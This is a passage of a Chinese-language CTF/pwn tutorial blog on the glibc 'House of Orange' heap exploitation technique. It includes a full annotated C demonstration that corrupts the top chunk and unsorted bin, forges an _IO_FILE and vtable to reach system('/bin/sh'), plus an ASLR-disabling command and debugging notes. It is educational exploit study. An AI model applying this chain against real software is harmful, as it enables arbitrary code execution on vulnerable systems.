class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  House of Orange 通过堆溢出从而破坏_IO_list_all指针</span></span><br><span class="line"><span class="comment">  House of Orange 要求堆地址和libc地址的泄露</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   winner这个函数仅仅是展现模拟system函数的地址已知的场景</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      House of Orange 首先假设一个堆溢出,使得Top chunk被破坏。</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      在程序执行的开始, 堆块是Top chunk的一部分.</span></span><br><span class="line"><span class="comment">      第一次的分配通常是Top chunk的一块，是通过服务请求从Top chunk切割下来</span></span><br><span class="line"><span class="comment">      因此每一次的分配Top chunk会随之变得更小</span></span><br><span class="line"><span class="comment">      在Top chunk的大小比我们所申请的堆块小时，就会出现以下两种情况：</span></span><br><span class="line"><span class="comment">       1) 扩大Top chunk</span></span><br><span class="line"><span class="comment">       2) 使用Mmap申请一个新内存</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      如果被请求的大小小于0x21000情况,前面的两种可能也是会出现的.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个技术的攻击模拟下通过malloc_printerr已经被移除了&quot;</span></span><br><span class="line">        <span class="string">&quot;这表示在91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26)后不再调用_IO_flush_all_lockpwhich is no longer calling _IO_flush_all_lockp.\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;从glibc2.24中_IO_FILE vtable会被检测用来对付这个exp的白名单&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      首先我们先分配一个chunk在堆上.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       堆通常被分配一个0x21000大小的top chunk,</span></span><br><span class="line"><span class="comment">       因为我们已经分配了一个0x400大小的堆块</span></span><br><span class="line"><span class="comment">       所以我们剩下0x20c00大小的堆块,包括PREV_INUSE,SIZE被0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       这个heap的边界是页对齐的.因为Top chunk是heap中的最后一个chunk.</span></span><br><span class="line"><span class="comment">       它必须在末尾是页对齐的</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       而且,如果一个与Top chunk在物理地址上相邻的chunk被释放后,它会与Top chunk合并.</span></span><br><span class="line"><span class="comment">       因此Top chunk的PREV_INUSE位总是被设置.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       所以这意味着有两个条件必须一直满足</span></span><br><span class="line"><span class="comment">        1) Top chunk + size 必须页对齐</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit必须被设置</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       我们能满足这两个条件如果我们设置Top chunk的size位为0xC00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       也就是0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       现在,让我们满足这两个条件</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       现在我们申请一个堆块大小,这个堆块的size比Top chunk的size位更大的堆块</span></span><br><span class="line"><span class="comment">       Malloc 尝试通过扩展Top chunk的来为这个请求提供服务</span></span><br><span class="line"><span class="comment">       这迫使系统调用被唤醒</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       在一般情况下, heap的内存布局很像如下</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       而且一个被分配的新区域对于就的堆块结尾影响不大.</span></span><br><span class="line"><span class="comment">       因此Top chunk新的size位是之前的Top chunk的size位+新分配的size大小</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       为了持续追踪size位的改变,malloc使用一个fencepost chunk(这个堆块总的来说是一个暂时的堆块)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       在Top chunk的size位被更新之后,这个fencepost chunk就会被free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       在我们这个场景中,heap的内存布局如下</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       在这种情况下, 新的Top将从与之前heap end地址相邻的内存空间开始</span></span><br><span class="line"><span class="comment">       因此在第二个堆块和heap end之间的这个空间是没有被使用的</span></span><br><span class="line"><span class="comment">       这个旧的Top chunk会被free</span></span><br><span class="line"><span class="comment">       因为旧的Top chunk的size比较大,所以当这个旧的Top chunk被释放的时候它的大小会被fastbin的堆块更大</span></span><br><span class="line"><span class="comment">       这个chunk就会被放入unsorted bins中</span></span><br><span class="line"><span class="comment">       现在我们申请一个chunk,这个chunk的size比新的top chunk更大</span></span><br><span class="line"><span class="comment">       这又会发生系统调用，并且最终会调用_int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      注意: 在chunk的高地址处将会被分配在不同的页中通过mmap调用. </span></span><br><span class="line"><span class="comment">      它将被放置在旧的heap end之后</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      现在我们留下是之前的Top chunk,这个Top chunk被释放并且加入到了unsorted bins中.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      这里开始阶段性的两个攻击. 我们存在一个堆溢出,这个堆溢出能溢出修改old Top chunk</span></span><br><span class="line"><span class="comment">      因此我们能修改chunk的size位</span></span><br><span class="line"><span class="comment">      第二阶段我们再一次利用溢出修改这个在unsorted bin链表的fd和bk指针</span></span><br><span class="line"><span class="comment">      有两个普通的方式利用当前的状态</span></span><br><span class="line"><span class="comment">        - 可以通过设置相应的指针,使得可以申请到任意地址 (要求至少两次申请)</span></span><br><span class="line"><span class="comment">        - 使用chunk的unlink操作使得main_arena中的unsorted bin链表指向可控的位置,并在该位置写入特定数据(要求至少一次的分配)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      之前的attack是非常直接了当利用,因此我们只详细说明一个第二种利用方式的一个变种.</span></span><br><span class="line"><span class="comment">      这种方式在Angelboy的博客文章(上面有给链接)发现并利用</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      这个攻击方式是非常惊人的,因为它的利用是当libc发现堆处于异常状态的时候会触发abort调用.</span></span><br><span class="line"><span class="comment">      无论何时abort被触发, 它都将通过调用_IO_flush_all_lockp刷新文件指针.</span></span><br><span class="line"><span class="comment">      最终, 会遍历链表_IO_list_all并且调用链表中的_IO_OVERFLOW.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      该方法是修改_IO_list_all使其指向我们伪造的文件结构体,</span></span><br><span class="line"><span class="comment">      在这个结构体中_IO_OVERLOW指向system函数并且这个结构体的前八字节要被设置为&#x27;/bin/sh&#x27;,</span></span><br><span class="line"><span class="comment">      以便于调用 _IO_OVERFLOW(fp, EOF)这个函数的时候会执行system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      更多关于文件指针的利用能在这篇博客中找到:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      _IO_list_all的地址可以从free chunk的fd和bk指针计算得到,因为他们当前指向的是libc的main_arena这个地址</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      我们计划修改已经被添加到unsorted bins链表中的old top的fd和bk指针</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      当malloc尝试满足从free chunk切割堆块的请求时,这个chunk-&gt;bk-&gt;fd的值会被修改成libc中的main_arena存放unsorted-</span></span><br><span class="line"><span class="comment">      bin链表指针的地址</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      注意:修改发生在合理性检查之前,因此这个无论如何都会发生</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      这里, 我们要求chunk-&gt;bk-&gt;fd的值成为_IO_list_all.</span></span><br><span class="line"><span class="comment">      因此, 我们应该设置chunk-&gt;bk为_IO_list_all - 16的值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      最后, system函数将被指向该文件指针的指针调用</span></span><br><span class="line"><span class="comment">      如果我们将前8字节填入/bin/sh, 程序就相当于调用system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp函数会遍历在_IO_list_all中的file指针链表.</span></span><br><span class="line"><span class="comment">      因为我们仅能用main_arena的unsorted-bin链表去修改这个地址.</span></span><br><span class="line"><span class="comment">      这个利用方式可以控制内存中相关的fd-ptr指针.</span></span><br><span class="line"><span class="comment">      下一个文件指针的地址被放在base_address+0x68(即0x68偏移处)</span></span><br><span class="line"><span class="comment">      被修改的文件指针对应于smallbin-4的位置,smallbin-4这个位置保存着90-98字节的smallbin堆块.</span></span><br><span class="line"><span class="comment">      想了解更多关于libc的bins结构请看这个博客:</span></span><br><span class="line"><span class="comment">  https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      因为我们溢出了old top chunk,我们也就可以控制它的size位.</span></span><br><span class="line"><span class="comment">      这里就有点棘手了, 当前的old chunk是在unsortedbin链表中.</span></span><br><span class="line"><span class="comment">      每次分配的时候, malloc首先尝试将unsortedbin chunk中的堆块提供给用户(切割堆块或者整块拿走),</span></span><br><span class="line"><span class="comment">      因此会遍历unsorted bin这个链表.</span></span><br><span class="line"><span class="comment">      遍历完之后, malloc将分类所有在unsorted bins中non-fitting的堆块,将这些堆块放入相应的bins中.</span></span><br><span class="line"><span class="comment">      如果我们设置堆块的size位为0x61 (prev_inuse 被设置为1)</span></span><br><span class="line"><span class="comment">      并且触发一个比non-fitting的chunk更小的分配(就是调用malloc(),申请一个小于non-fitting chunk的大小),</span></span><br><span class="line"><span class="comment">      malloc将这个old chunk分类进smallbin-4这个堆块中</span></span><br><span class="line"><span class="comment">      因为这个bin当前没有堆块(也就是空的),所以old top chunk将成为新的头结点,</span></span><br><span class="line"><span class="comment">      因此,这个old top chunk的地址会占据位于main_arena中的smallbin[4]这个元素 </span></span><br><span class="line"><span class="comment">      并且最终会被假的文件指针的fd指针取代.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      除了分类之外, malloc也将对smallbin中的chunk进行size位的检查</span></span><br><span class="line"><span class="comment">      因此在对old top chunk分类和同构伪造的指针找到 _IO_list_all之后, </span></span><br><span class="line"><span class="comment">      malloc将检查相应的位,查看size是否比MINSIZE小(一个宏定义相应的检查为size &lt;= 2 * SIZE_SZ)</span></span><br><span class="line"><span class="comment">      并且最后触发abort函数调用,在调用时就会触发我们的利用链.</span></span><br><span class="line"><span class="comment">      下面一个网址是相应的利用链:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      我们来到了下一阶段,这个阶段我们要绕过假文件指针的一些限制</span></span><br><span class="line"><span class="comment">      在函数_IO_flush_all_lockp中会对做这些限制,并且在这里会做检测,相关的源码如下:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      我们如果想要绕过限制,需要满足的第一个条件如下:We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. 设置mode为0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. 设置write_base 为 2 and write_ptr 为 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) 最后设置这个跳表指向可控的内存,并且放置system函数在那里.</span></span><br><span class="line"><span class="comment">      如下的跳表指针在FILE struct是正确的:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 最后, 触发整个IO链,通过调用malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     libc&#x27;的错误信息将被打印到屏幕上,但是你将有极高的概率getshell(有时会真报错而推出程序).</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用过程1构造unsorted_bin"><a class="markdownIt-Anchor" href="#利用过程1构造unsorted_bin"></a> 利用过程1(构造unsorted_bin)</h2><ul><li><p><strong>house-of-orange</strong>这个打法是在没有<code>free</code>的情况下，要利用堆溢出或者其他对堆的正常操作，使得<strong>top_chunk</strong>空间不够，此时就会触发一个系统调用，该系统调用就会向操作系统申请一个<strong>新的top_chunk</strong>，这个时候我们就从<strong>无free</strong>的条件下，构造出了一个放在<strong>unsorted_bin</strong>中的堆块。</p></li><li><p>对于如上构造<strong>unsorted_bin</strong>的方法，目前我已知的有俩中方法：</p><ul><li>利用<strong>house-of-force</strong>通过堆溢出，对<strong>top_chunk</strong>的<strong>size</strong>位直接修改（要满足<strong>top_chunk_size修改+前面申请的堆块size=0x1000对齐</strong>）。（利用漏洞的方式）</li><li>利用程序的运行逻辑，该程序单次申请能申请比较大的堆块，这样我们就有机会消耗完<strong>top_chunk</strong>的内存空间。（正常方法）</li></ul></li><li><p>接下来我们进行调试，为了调试方便我们先关闭一下随机地址偏移。由于我使用的是Docker，所以直接在宿主机关掉随机地址偏移即可。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure><ul><li>接下来开始正式的调试，所以我们就可以进行调试，我们这边先申请了一个<code>size=0x400</code>大小的堆块，先对堆块初始化。</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602020313200.png" alt="image-20250602020313200"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602020320176.png" alt="image-20250602020320176"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602020533780.png" alt="image-20250602020533780"></p><ul><li>接下来我们为了方便调试，我们就不多申请那么大的堆块了，就直接修改<strong>top_chunk</strong>的<strong>size</strong>位为<strong>0xc01</strong>。</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602020703406.png" alt="image-20250602020703406"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602020717820.png" alt="image-20250602020717820"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602020737334.png" alt="image-20250602020737334"></p><ul><li>接下来我们申请一个<strong>大于0xc00</strong>大小的堆块，这就使得我们<strong>top_chunk</strong>我们无法满足用户所申请的堆块大小，触发系统调用，使得<strong>旧top_chunk</strong>放入<strong>unsorted_bin</strong>，接下来我们申请了一个<code>0x1000</code>大小的堆块。接下来我们来调试这个过程。</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602021926744.png" alt="image-20250602021926744"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602022014579.png" alt="image-20250602022014579"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602022038101.png" alt="image-20250602022038101"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602022455028.png" alt="image-20250602022455028"></p><p><strong>此时我们就完成了攻击的第一步，即构造出了大堆块并且放入了<code>unsortedbin</code>中里面去</strong></p><h2 id="利用过程2了解io"><a class="markdownIt-Anchor" href="#利用过程2了解io"></a> 利用过程2(了解IO)</h2><ul><li>接下来我们就进行一个目前PWN的主流方法，也就是<strong>伪造或劫持IOFILE</strong></li><li>前提介绍：<ul><li>当libc发现堆处于异常状态的时候会触发abort调用</li><li>无论何时abort被触发, 它都将通过调用**_IO_flush_all_lockp**刷新文件指针.</li><li>最终, 会遍历链表**_IO_list_all<strong>并且调用链表中的</strong>_IO_OVERFLOW**.</li><li>该方法是修改**_IO_list_all<strong>使其</strong>指向我们伪造的文件结构体**</li><li>在这个结构体中**_IO_OVERLOW**指向system函数并且这个结构体的前八字节要被设置为’/bin/sh’</li><li>以便于调用 <strong>_IO_OVERFLOW(fp, EOF)<strong>这个函数的时候会执行</strong>system(‘/bin/sh’)</strong></li></ul></li><li><strong>几点明确</strong>：<ol><li><strong>_IO_list_all</strong>是一个指向如下结构体的指针，该结构体如下，并且它就是单独一个指针。</li><li><strong>vtable</strong>是指向**_IO_file_jumps<strong>的一个指针，而</strong>_IO_file_jumps<strong>本身是一个指针指向的是</strong>jumps结构体**</li></ol></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> &#123;</span></span><br><span class="line">    _IO_FILE file;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span>  <span class="comment">// &lt;-- 跳转表(IO_jumps)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><pre><code>2. **_IO_FILE**是一个结构体，里面存放着许多指针和其他类型的数据2. **_IO_file_jumps**是一个指针，它类似于**__IO_list_all**这个指针，指向的是一个结构体。**jumps结构体如下(部分)**，具体查看`glibc-2.23\libio\fileops.c`</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  